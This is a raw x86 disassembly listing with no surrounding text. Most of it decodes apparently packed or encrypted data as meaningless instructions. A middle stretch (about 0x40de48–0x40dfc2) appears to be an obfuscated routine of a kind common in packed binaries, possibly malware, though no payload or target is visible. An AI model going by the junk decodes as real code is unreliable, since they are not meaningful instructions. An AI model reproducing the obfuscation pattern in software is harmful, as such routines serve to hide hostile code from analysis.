  40da04:	mov    DWORD PTR [ecx+0x1f091ddc],ebx
  40da0a:	mov    eax,ds:0xf01c3d3e
  40da0f:	jg     0x40da39
  40da11:	dec    esi
  40da12:	std    
  40da13:	call   0x9855e71a
  40da18:	mov    eax,ds:0x442f26ba
  40da1d:	ret    
  40da1e:	data16 ins BYTE PTR es:[edi],dx
  40da20:	nop
  40da21:	retf   0xee85
  40da24:	daa    
  40da25:	push   eax
  40da26:	inc    edx
  40da27:	inc    ebx
  40da28:	iret   
  40da29:	adc    BYTE PTR [ecx+0x4a0daf86],al
  40da2f:	mov    cl,0x71
  40da31:	xchg   ecx,eax
  40da32:	int3   
  40da33:	fwait
  40da34:	fs nop
  40da36:	nop
  40da37:	arpl   WORD PTR [esi+0x15],ax
  40da3a:	fs call 0x2416:0xd9c7cff2
  40da42:	dec    ebp
  40da43:	mov    ah,0xd3
  40da45:	sbb    BYTE PTR [ebx],ch
  40da47:	or     al,0x3f
  40da49:	push   esp
  40da4a:	mov    ch,BYTE PTR [edx-0x76]
  40da4d:	mov    ds:0xa4ea7778,al
  40da52:	jge    0x40d9e0
  40da54:	dec    esi
  40da55:	icebp  
  40da56:	fidiv  WORD PTR [eax+ebp*2]
  40da59:	xchg   DWORD PTR [ebp-0x3a],edx
  40da5c:	retf   0x4853
  40da5f:	(bad)  
  40da60:	gs movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40da63:	sub    BYTE PTR [edx],bl
  40da65:	aam    0xb5
  40da67:	xor    al,0x3a
  40da69:	mov    ds:0xcd81923d,al
  40da6e:	cmp    BYTE PTR [edi-0x49062a97],ch
  40da74:	test   DWORD PTR [edi],esp
  40da76:	dec    ebx
  40da77:	dec    BYTE PTR [ecx+0x5]
  40da7a:	add    edi,DWORD PTR [ecx]
  40da7c:	(bad)  
  40da7d:	and    eax,0xfd464286
  40da82:	ud2    
  40da84:	imul   edx,edx,0xe4ecc75e
  40da8a:	push   ecx
  40da8b:	lea    edi,es:[edi-0x67]
  40da8f:	pop    esp
  40da90:	and    eax,0x9749226f
  40da95:	pop    eax
  40da96:	sub    al,0x46
  40da98:	retf   0x4350
  40da9b:	mov    al,ds:0xa8a39764
  40daa0:	aas    
  40daa1:	shl    BYTE PTR [ebx+0x8bd4cbb],1
  40daa7:	std    
  40daa8:	into   
  40daa9:	push   edx
  40daaa:	sbb    BYTE PTR [edx],bl
  40daac:	and    eax,0x3a337864
  40dab1:	fcom   QWORD PTR [ebp-0x28]
  40dab4:	cld    
  40dab5:	dec    eax
  40dab6:	push   ecx
  40dab7:	test   BYTE PTR [eax+ecx*2-0x3390e27a],ch
  40dabe:	in     al,dx
  40dabf:	jae    0x40da80
  40dac1:	mov    WORD PTR ds:0x8b88c3bd,cs
  40dac7:	ret    0x5b2b
  40daca:	jecxz  0x40db13
  40dacc:	mov    cl,0xfa
  40dace:	inc    eax
  40dacf:	les    eax,FWORD PTR [esi+0x24275b58]
  40dad5:	ss adc al,0x53
  40dad8:	push   ebx
  40dad9:	lock in al,0x79
  40dadc:	adc    ebx,DWORD PTR [edx+0x1b]
  40dadf:	jg     0x40daa9
  40dae1:	jg     0x40da63
  40dae3:	pop    ebx
  40dae4:	dec    esp
  40dae5:	cmp    BYTE PTR [eax+0x2df35ff4],dh
  40daeb:	(bad)  
  40daec:	pop    esp
  40daed:	xchg   edx,eax
  40daee:	cwde   
  40daef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daf0:	sbb    DWORD PTR [esi-0x77],0x2016c59e
  40daf7:	pop    esi
  40daf8:	xlat   BYTE PTR ds:[ebx]
  40daf9:	xor    esi,DWORD PTR [eax+0xc]
  40dafc:	push   edx
  40dafd:	xchg   esi,eax
  40dafe:	sub    BYTE PTR [ecx],ch
  40db00:	cwde   
  40db01:	iret   
  40db02:	(bad)  
  40db03:	loopne 0x40db75
  40db05:	test   eax,0x19f1b3d
  40db0a:	jb     0x40dadb
  40db0c:	lods   al,BYTE PTR ds:[esi]
  40db0d:	push   ds
  40db0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db0f:	mov    cl,0xef
  40db11:	pop    edi
  40db12:	xchg   DWORD PTR [edi-0x7],ebp
  40db15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db16:	push   es
  40db17:	daa    
  40db18:	aad    0x1
  40db1a:	inc    eax
  40db1b:	mov    WORD PTR [edi+0x402f32d6],es
  40db21:	pop    eax
  40db22:	xchg   ebp,eax
  40db23:	inc    eax
  40db24:	adc    eax,0xb4284ed8
  40db29:	loope  0x40db39
  40db2b:	mov    WORD PTR [edx-0x41],ss
  40db2e:	pop    es
  40db2f:	sar    BYTE PTR [edx],0xf1
  40db32:	xor    bl,cl
  40db34:	cmp    cl,dl
  40db36:	gs xchg edi,eax
  40db38:	rcl    BYTE PTR [esp+edi*4-0xd],1
  40db3c:	test   al,0x98
  40db3e:	mov    eax,ebp
  40db40:	ror    DWORD PTR [edi+ecx*8-0x2b841a27],1
  40db47:	loope  0x40daf0
  40db49:	loopne 0x40dbad
  40db4b:	popa   
  40db4c:	ror    BYTE PTR [ebp+0xe5ac2e1],cl
  40db52:	xchg   edx,eax
  40db53:	and    BYTE PTR [edi-0x77],al
  40db56:	pop    ebp
  40db57:	fild   QWORD PTR [edx+0x67]
  40db5a:	mov    ebx,DWORD PTR [ebx]
  40db5c:	sub    ebp,DWORD PTR [ebp+0x45cf22e1]
  40db62:	sub    DWORD PTR [eax+0x7b],0xffffffaf
  40db66:	aad    0x73
  40db68:	add    ch,BYTE PTR [eax+0xd]
  40db6b:	mov    cl,BYTE PTR [edx-0x2f]
  40db6e:	xor    eax,0x9a1df016
  40db73:	test   DWORD PTR [edi+esi*2+0x7a869c37],esp
  40db7a:	loopne 0x40db29
  40db7c:	cmp    DWORD PTR [ebp-0x6a],edi
  40db7f:	retf   0x4b93
  40db82:	ds call 0xf28ad749
  40db88:	inc    ecx
  40db89:	or     edx,DWORD PTR [edx-0x1f]
  40db8c:	mov    eax,ds:0x9f04b119
  40db91:	jbe    0x40db9c
  40db93:	hlt    
  40db94:	cmp    al,0xb8
  40db96:	cmp    DWORD PTR ds:0x41dbbad4,0xffffff9b
  40db9d:	jge    0x40db5d
  40db9f:	retf   0x6fa9
  40dba2:	mov    al,0x4f
  40dba4:	jle    0x40db8c
  40dba6:	retf   
  40dba7:	inc    ecx
  40dba8:	loope  0x40db5a
  40dbaa:	adc    DWORD PTR [eax+ebp*8+0x44462a05],eax
  40dbb1:	lds    edx,FWORD PTR [eax+0x8]
  40dbb4:	lods   al,BYTE PTR ds:[esi]
  40dbb5:	in     eax,0x1f
  40dbb7:	test   al,0xf0
  40dbb9:	sbb    al,BYTE PTR [esi+0x2f9fac6a]
  40dbbf:	fisub  WORD PTR [esi-0x30e1c5d5]
  40dbc5:	sub    ebp,DWORD PTR [ecx+ecx*2-0x5a3835b8]
  40dbcc:	jecxz  0x40dba8
  40dbce:	leave  
  40dbcf:	adc    al,0x2e
  40dbd1:	bnd jge 0x40dc0c
  40dbd4:	push   edx
  40dbd5:	fs inc eax
  40dbd7:	and    dh,BYTE PTR [edx+0x43]
  40dbda:	jne    0x40db78
  40dbdc:	or     ch,BYTE PTR [ebx+0x53717ac7]
  40dbe2:	fnstsw WORD PTR ds:0x60cef4d1
  40dbe8:	jl     0x40dc17
  40dbea:	pop    ebp
  40dbeb:	scas   al,BYTE PTR es:[edi]
  40dbec:	sub    ecx,DWORD PTR [esi]
  40dbee:	sti    
  40dbef:	(bad)  
  40dbf0:	int    0x12
  40dbf2:	cmp    al,0x53
  40dbf4:	inc    ecx
  40dbf5:	mov    ch,0x36
  40dbf7:	adc    dh,cl
  40dbf9:	push   ebp
  40dbfa:	hlt    
  40dbfb:	daa    
  40dbfc:	icebp  
  40dbfd:	or     DWORD PTR [edi],eax
  40dbff:	mov    al,0x5e
  40dc01:	sub    DWORD PTR [ebp+eax*4+0x32439c7b],edi
  40dc08:	jmp    DWORD PTR [edi-0xbc2bf60]
  40dc0e:	and    al,0x6e
  40dc10:	pop    edi
  40dc11:	lds    edi,FWORD PTR [esp+edi*1]
  40dc14:	push   edi
  40dc15:	inc    esi
  40dc16:	xchg   edx,eax
  40dc17:	jg     0x40dc6e
  40dc19:	ss xchg ebx,eax
  40dc1b:	sbb    al,0x79
  40dc1d:	mov    ah,0xdf
  40dc1f:	mov    al,ds:0xf7b95e02
  40dc24:	inc    eax
  40dc25:	fcom   st(5)
  40dc27:	fbstp  TBYTE PTR [esp+eax*1]
  40dc2a:	rol    DWORD PTR ds:0xac1e3a61,1
  40dc30:	js     0x40dca7
  40dc32:	arpl   WORD PTR [edx-0x404ecf29],bx
  40dc38:	adc    DWORD PTR [eax],esi
  40dc3a:	or     DWORD PTR [ebx+0x12eab02f],ebx
  40dc40:	rcl    DWORD PTR [edx+0x5e2e62d2],1
  40dc46:	or     ebp,DWORD PTR [esi+0xb]
  40dc49:	pop    ds
  40dc4a:	xlat   BYTE PTR ds:[ebx]
  40dc4b:	nop
  40dc4c:	xlat   BYTE PTR ds:[ebx]
  40dc4d:	test   al,0xf3
  40dc4f:	and    BYTE PTR [ebx-0x38],0x3c
  40dc53:	add    BYTE PTR [ebx+0x116b7be2],dh
  40dc59:	sub    esp,DWORD PTR [eax]
  40dc5b:	repz inc edi
  40dc5d:	hlt    
  40dc5e:	jg     0x40dc8a
  40dc60:	mov    DWORD PTR [ebp+0x78],ecx
  40dc63:	push   eax
  40dc64:	stos   BYTE PTR es:[edi],al
  40dc65:	jne    0x40dbf9
  40dc67:	or     al,0x5
  40dc69:	jb     0x40dc8d
  40dc6b:	aad    0xec
  40dc6d:	scas   eax,DWORD PTR es:[edi]
  40dc6e:	sbb    BYTE PTR [ebx],cl
  40dc70:	call   0x964c95b3
  40dc75:	and    BYTE PTR [esi+0x401d2b8d],ah
  40dc7b:	loopne 0x40dca0
  40dc7d:	pop    esi
  40dc7e:	jp     0x40dc78
  40dc80:	push   0x1a
  40dc82:	repz sub DWORD PTR [esi-0x68c4fb],0x1c
  40dc8a:	dec    esp
  40dc8b:	push   esi
  40dc8c:	mul    BYTE PTR [esi+0x747e1316]
  40dc92:	push   ss
  40dc93:	dec    ebp
  40dc94:	mov    edi,0xa3b288fe
  40dc99:	sbb    al,BYTE PTR [eax-0x4c]
  40dc9c:	in     eax,dx
  40dc9d:	mov    ecx,0x522dd4b3
  40dca2:	mov    bl,0x97
  40dca4:	cli    
  40dca5:	inc    ebx
  40dca6:	les    esi,FWORD PTR [esi+0x5]
  40dca9:	nop
  40dcaa:	mov    ch,0x5c
  40dcac:	fmul   QWORD PTR [ebx+0x786d7b2]
  40dcb2:	scas   eax,DWORD PTR es:[edi]
  40dcb3:	push   es
  40dcb4:	adc    al,0x8a
  40dcb6:	lahf   
  40dcb7:	dec    edi
  40dcb8:	push   cs
  40dcb9:	dec    esp
  40dcba:	cmp    BYTE PTR [edi],al
  40dcbc:	sub    DWORD PTR [ebp+0x19],0x13
  40dcc0:	xor    BYTE PTR ds:0x25888fc7,al
  40dcc6:	frstor [edx]
  40dcc8:	cld    
  40dcc9:	jp     0x40dd0c
  40dccb:	push   ecx
  40dccc:	adc    al,0x24
  40dcce:	dec    ecx
  40dccf:	in     al,dx
  40dcd0:	pop    ss
  40dcd1:	cli    
  40dcd2:	out    0x2b,eax
  40dcd4:	mov    dh,0xf3
  40dcd6:	pop    ss
  40dcd7:	fsub   QWORD PTR ds:0x9ba1804b
  40dcde:	inc    edi
  40dcdf:	sub    al,0x66
  40dce1:	js     0x40dc7b
  40dce3:	outs   dx,BYTE PTR ds:[esi]
  40dce4:	popa   
  40dce5:	push   esi
  40dce6:	popf   
  40dce7:	fnsave [ebx]
  40dce9:	out    0x21,al
  40dceb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcec:	popa   
  40dced:	imul   eax,DWORD PTR [edx],0x354ef9a8
  40dcf3:	outs   dx,BYTE PTR ds:[esi]
  40dcf4:	hlt    
  40dcf5:	adc    DWORD PTR ds:0xa27ffc42,0xffffffac
  40dcfc:	out    dx,al
  40dcfd:	cmp    al,0x93
  40dcff:	ss jne 0x40dca6
  40dd02:	push   ebx
  40dd03:	je     0x40dc92
  40dd05:	inc    edi
  40dd06:	or     ebp,DWORD PTR [edi-0x43]
  40dd09:	fmul   DWORD PTR [ebp+edx*8+0x27e5f3fd]
  40dd10:	(bad)  
  40dd11:	scas   al,BYTE PTR es:[edi]
  40dd12:	aas    
  40dd13:	out    dx,al
  40dd14:	sbb    edi,ebp
  40dd16:	mov    ebx,edi
  40dd18:	pop    es
  40dd19:	nop
  40dd1a:	ins    DWORD PTR es:[edi],dx
  40dd1b:	fcomp  DWORD PTR ds:0xeeba90fe
  40dd21:	sub    esi,DWORD PTR [esp+ebp*1]
  40dd24:	cmp    eax,0x9eb04938
  40dd29:	or     eax,0x1f95ecf9
  40dd2e:	xor    DWORD PTR [edi+0x404788e2],eax
  40dd34:	push   DWORD PTR [eax]
  40dd36:	jg     0x40dcbf
  40dd38:	clc    
  40dd39:	pusha  
  40dd3a:	retf   
  40dd3b:	scas   al,BYTE PTR es:[edi]
  40dd3c:	leave  
  40dd3d:	out    dx,eax
  40dd3e:	sbb    eax,0xaf77fc7e
  40dd43:	mul    ebx
  40dd45:	je     0x40dd4c
  40dd47:	pop    ss
  40dd48:	xchg   BYTE PTR [edi+0x3a],dh
  40dd4b:	cwde   
  40dd4c:	jb     0x40dcdc
  40dd4e:	(bad)  
  40dd4f:	inc    eax
  40dd50:	and    ecx,DWORD PTR ds:0xc5bbc2fe
  40dd56:	iret   
  40dd57:	shr    BYTE PTR [ecx+0x2a3a45b5],0x50
  40dd5e:	cmp    BYTE PTR [ebp+0x42],bl
  40dd61:	dec    ebp
  40dd62:	sahf   
  40dd63:	cli    
  40dd64:	adc    DWORD PTR [eax-0x14546a59],0x51
  40dd6b:	out    dx,al
  40dd6c:	and    ch,BYTE PTR [eax+eiz*4+0x6ee5443b]
  40dd73:	(bad)  
  40dd75:	mov    esi,0xbd3fa56e
  40dd7a:	pop    esi
  40dd7b:	push   esi
  40dd7c:	pusha  
  40dd7d:	sbb    al,0x7d
  40dd7f:	leave  
  40dd80:	enter  0x26f0,0xd0
  40dd84:	inc    ebx
  40dd85:	dec    ecx
  40dd87:	cmp    dl,ah
  40dd89:	jle    0x40ddcb
  40dd8b:	lahf   
  40dd8c:	adc    dl,al
  40dd8e:	mov    esi,0xf1144552
  40dd93:	add    DWORD PTR [esp+ecx*4],esp
  40dd96:	shr    DWORD PTR [ebp+0x33],0x17
  40dd9a:	mov    edi,0xa141d523
  40dd9f:	ja     0x40dde2
  40dda1:	stos   BYTE PTR es:[edi],al
  40dda2:	test   al,0x59
  40dda4:	cld    
  40dda5:	(bad)  
  40dda6:	adc    eax,0x2248d188
  40ddab:	call   0x16ee72e9
  40ddb0:	sahf   
  40ddb1:	das    
  40ddb2:	sub    BYTE PTR [ebp+0x457b18db],0x6e
  40ddb9:	mov    ebp,0x1245794c
  40ddbe:	shl    BYTE PTR [ebp-0x3063e3ad],0x97
  40ddc5:	mov    ds:0x3e17f843,eax
  40ddca:	fimul  WORD PTR [ecx-0x58]
  40ddcd:	dec    ebp
  40ddce:	sbb    DWORD PTR [edi],esp
  40ddd0:	pop    es
  40ddd1:	mov    cl,0x7f
  40ddd3:	push   esi
  40ddd4:	dec    esi
  40ddd5:	mov    eax,ds:0x2838ae23
  40ddda:	push   0xffffffe0
  40dddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dddd:	int    0x8d
  40dddf:	dec    esp
  40dde0:	cmp    al,0x36
  40dde2:	ret    
  40dde3:	mov    esi,0xf53b0610
  40dde8:	rol    DWORD PTR [edx+0xe],cl
  40ddeb:	je     0x40de1b
  40dded:	in     al,dx
  40ddee:	fisttp WORD PTR [ebp-0x9]
  40ddf1:	sbb    al,0x25
  40ddf3:	mov    esi,0x2a36c5
  40ddf8:	pop    edx
  40ddf9:	dec    ecx
  40ddfa:	div    BYTE PTR [esi+0x7d]
  40ddfd:	dec    edx
  40ddfe:	push   0xf10bcb8
  40de03:	push   ebp
  40de04:	pop    ebx
  40de05:	inc    ecx
  40de06:	(bad)  
  40de07:	rsm    
  40de09:	idiv   DWORD PTR [ebx+0x4e7aa98c]
  40de0f:	inc    edx
  40de10:	mov    dh,0xa
  40de12:	dec    esp
  40de13:	or     BYTE PTR [ebp-0x60d80758],0x4c
  40de1a:	leave  
  40de1b:	or     al,0xe1
  40de1d:	pop    edx
  40de1e:	sub    al,0x26
  40de20:	std    
  40de21:	loop   0x40ddf1
  40de23:	(bad)  
  40de24:	add    eax,0x51042dc5
  40de29:	sbb    dl,BYTE PTR [ebx-0xb4d7276]
  40de2f:	pop    ss
  40de30:	xor    al,0x6b
  40de32:	ret    
  40de33:	jno    0x40ddf9
  40de35:	push   edi
  40de36:	xor    DWORD PTR cs:[edi+0x69702a9d],ebx
  40de3d:	mov    ch,0x42
  40de3f:	push   cs
  40de40:	pop    ebp
  40de41:	sbb    BYTE PTR [esi+eiz*1],dh
  40de44:	sub    edx,ebp
  40de46:	clc    
  40de47:	xlat   BYTE PTR ds:[ebx]
  40de48:	imul   ebp,DWORD PTR [ebp+0x413d9343],0x458bf809
  40de52:	cld    
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42f00c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x431000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x433000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x432010
  40de84:	or     DWORD PTR ds:0x43000c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x432014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x430014,0x42f028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x43101c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x431010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x43201c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x433010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x43201c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x42f020,0x1c
  40defb:	cmp    DWORD PTR ds:0x42f020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x42f020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x42b020
  40df28:	cmp    DWORD PTR ds:0x42f020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x42f020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x42f020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x42f020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x42f020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0x98
  40dfd4:	rcr    esp,0xc3
  40dfd7:	(bad)
  40dfda:	(bad)  
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx+0xb]
  40dfe0:	add    BYTE PTR [eax],ch
  40dfe2:	add    BYTE PTR ds:0x6c8ab07f,bh
  40dfe8:	mov    esi,DWORD PTR ds:0x554a7686
  40dfee:	ret    0x44e1
  40dff1:	fwait
  40dff2:	or     DWORD PTR [eax-0x2161c1a9],esp
  40dff8:	scas   eax,DWORD PTR es:[edi]
  40dff9:	or     DWORD PTR [edi+0x76],esp
  40dffc:	mov    esi,0x4e1d1a2c
  40e001:	je     0x40e048
  40e003:	in     eax,dx
  40e004:	into   
  40e005:	jle    0x40dfa3
  40e007:	or     al,0x8c
  40e009:	ds daa 
  40e00b:	iret   
  40e00c:	dec    edi
  40e00d:	outs   dx,DWORD PTR ds:[esi]
  40e00e:	and    esi,eax
  40e010:	retf   0xc768
  40e013:	jae    0x40e093
  40e015:	mov    ebp,0xf5bdb5ef
  40e01a:	cmp    eax,ebx
  40e01c:	pop    esi
  40e01d:	xor    al,0xe
  40e01f:	jge    0x40e041
  40e021:	mov    al,ds:0x6dd977d6
  40e026:	ins    DWORD PTR es:[edi],dx
  40e027:	mov    ebp,edx
  40e029:	pop    es
  40e02a:	xor    eax,0xc07f7075
  40e02f:	add    eax,esi
  40e031:	xor    DWORD PTR [esi-0x69],eax
  40e034:	adc    BYTE PTR [esi-0x28c5a218],dh
  40e03a:	xchg   esi,eax
  40e03b:	call   0xbf6d:0x6241ef83
  40e042:	xchg   ebp,eax
  40e043:	sbb    DWORD PTR [esp+eax*2-0x72],esi
  40e047:	dec    edx
  40e048:	sbb    DWORD PTR [esi-0x67],eax
  40e04b:	icebp  
  40e04c:	aas    
  40e04d:	fbstp  TBYTE PTR [ebx+0x79]
  40e050:	popa   
  40e051:	xlat   BYTE PTR ds:[ebx]
  40e052:	lods   eax,DWORD PTR ds:[esi]
  40e053:	mov    ebp,0x76754bc7
  40e058:	push   esp
  40e059:	jb     0x40e03a
  40e05b:	mov    bh,0x94
  40e05d:	inc    ebx
  40e05e:	add    al,0x18
  40e060:	lds    esi,FWORD PTR [ebx]
  40e062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e063:	add    al,BYTE PTR [edx+0x30677c71]
  40e069:	ds dec eax
  40e06b:	test   eax,0xf723eeb7
  40e070:	or     ebp,esi
  40e072:	jge    0x40dff5
  40e074:	mov    ds:0x6c10105a,al
  40e079:	sub    DWORD PTR [eax+ecx*2-0x3e],eax
  40e07d:	nop
  40e07e:	mov    ebp,0xc6245c0c
  40e083:	cmp    ah,dl
  40e085:	mov    DWORD PTR [ebx],esi
  40e087:	pop    edi
  40e088:	or     al,0xfa
  40e08a:	mov    ecx,0xcc9229b1
  40e08f:	or     bh,BYTE PTR [eax]
  40e091:	and    al,0xe8
  40e093:	(bad)  
  40e094:	mov    cl,0x9a
  40e096:	ror    BYTE PTR ds:0xf2a3704f,1
  40e09c:	mov    WORD PTR [esi],?
  40e09e:	rcr    BYTE PTR [edi-0x69c4f4c5],cl
  40e0a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0a5:	or     al,0xd4
  40e0a7:	sar    BYTE PTR [edi-0x5b7f01b1],0x57
  40e0ae:	inc    ecx
  40e0af:	test   DWORD PTR [eax-0x25],esp
  40e0b2:	cmp    bl,BYTE PTR [edx+0x4]
  40e0b5:	dec    edx
  40e0b6:	cld    
  40e0b7:	loopne 0x40e0d9
  40e0b9:	or     ah,BYTE PTR [ecx+esi*4+0x55]
  40e0bd:	sub    BYTE PTR [ebx+0x11],ah
  40e0c0:	jp     0x40e0d6
  40e0c2:	inc    esi
  40e0c3:	dec    ebx
  40e0c4:	xor    al,0xdb
  40e0c6:	jmp    0x8f8fdfcd
  40e0cb:	aad    0xd
  40e0cd:	in     al,0x2b
  40e0cf:	xor    eax,0x28310e99
  40e0d4:	aam    0xbd
  40e0d6:	mov    ds:0x14ca6797,al
  40e0db:	add    ch,dh
  40e0dd:	inc    ebp
  40e0de:	jns    0x40e143
  40e0e0:	popa   
  40e0e1:	jle    0x40e0c1
  40e0e3:	push   0x1e
  40e0e5:	push   ebx
  40e0e6:	xor    al,BYTE PTR [edi-0x71]
  40e0e9:	cmp    eax,ebx
  40e0eb:	dec    edi
  40e0ec:	mov    ds:0x1d5dada7,al
  40e0f1:	mov    ebp,0x6483e544
  40e0f6:	(bad)  
  40e0f7:	cmp    bh,BYTE PTR ds:0x6432d8a4
  40e0fd:	in     al,0x9e
  40e0ff:	add    esi,DWORD PTR ds:0xd66d255e
  40e105:	retf   
  40e106:	into   
  40e107:	fadd   DWORD PTR [ebp+0x7c]
  40e10a:	loope  0x40e0f8
  40e10c:	jbe    0x40e0fe
  40e10e:	cmc    
  40e10f:	jnp    0x40e109
  40e111:	sub    ebx,eax
  40e113:	push   ebp
  40e114:	add    DWORD PTR [ebx-0x37ec771c],eax
  40e11a:	outs   dx,BYTE PTR ds:[esi]
  40e11b:	cmp    edi,edx
  40e11d:	mov    ebp,0x36a15a32
  40e122:	push   ecx
  40e123:	sbb    BYTE PTR [esi],bh
  40e125:	in     eax,dx
  40e126:	push   edx
  40e127:	test   al,0x7
  40e129:	lock or ebp,DWORD PTR [ecx-0x3392e6e7]
  40e130:	push   esi
  40e131:	add    al,0x6c
  40e133:	mov    cl,0xbd
  40e135:	imul   edi,DWORD PTR [ecx-0x3fc13e1f],0xbb4456df
  40e13f:	sub    ebx,DWORD PTR [esi+ebx*8]
  40e142:	push   ebx
  40e143:	outs   dx,DWORD PTR ds:[esi]
  40e144:	out    dx,eax
  40e145:	dec    ebp
  40e146:	out    0x56,al
  40e148:	mov    cl,bh
  40e14a:	sub    al,0x87
  40e14c:	retf   0xb5c
  40e14f:	imul   esi,DWORD PTR [esi],0xc99e95d4
  40e155:	sbb    eax,0x2b4f6614
  40e15a:	or     DWORD PTR [ebp-0x27254807],esp
  40e160:	xchg   ebx,eax
  40e161:	cwde   
  40e162:	test   eax,0x54f84856
  40e167:	out    0x2e,eax
  40e169:	into   
  40e16a:	push   0x17
  40e16c:	bound  edi,QWORD PTR [esi+ebp*2+0x30]
  40e170:	out    0x9e,al
  40e172:	arpl   WORD PTR [ebx],ax
  40e174:	cwde   
  40e175:	repz mov ?,ecx
  40e178:	cmp    DWORD PTR [edi-0x26a49b03],0x26
  40e17f:	aaa    
  40e180:	(bad)
  40e183:	cs adc eax,0x2eeae6de
  40e189:	xchg   DWORD PTR [eax+0x53b82f01],ebp
  40e18f:	cld    
  40e190:	xor    eax,0x1aeaabee
  40e195:	fcomp  st(2)
  40e197:	cmp    DWORD PTR [ecx],ecx
  40e199:	cmp    eax,0x4871fdce
  40e19e:	pop    ds
  40e19f:	jnp    0x40e1dd
  40e1a1:	xchg   edx,eax
  40e1a2:	jo     0x40e133
  40e1a4:	inc    eax
  40e1a5:	cmc    
  40e1a6:	lods   al,BYTE PTR ds:[esi]
  40e1a7:	xchg   ebx,eax
  40e1a8:	mov    dh,0xef
  40e1aa:	mov    bl,0xde
  40e1ac:	and    BYTE PTR [edx-0x51],al
  40e1af:	dec    ecx
  40e1b0:	jo     0x40e1b1
  40e1b2:	add    eax,0xfc4412c0
  40e1b7:	shl    DWORD PTR [edi+0x61],1
  40e1ba:	mov    BYTE PTR [ebx+0x24],bh
  40e1bd:	add    DWORD PTR [esi-0x54],ebp
  40e1c0:	mov    ch,0xd
  40e1c2:	pop    ss
  40e1c3:	iret   
  40e1c4:	icebp  
  40e1c5:	fdivrp st(4),st
  40e1c7:	hlt    
  40e1c8:	pop    ds
  40e1c9:	push   ss
  40e1ca:	jmp    0xb9539261
  40e1cf:	inc    ebx
  40e1d0:	xor    eax,0x742adae3
  40e1d5:	punpckldq mm3,DWORD PTR [esi-0xd]
  40e1d9:	outs   dx,BYTE PTR ds:[esi]
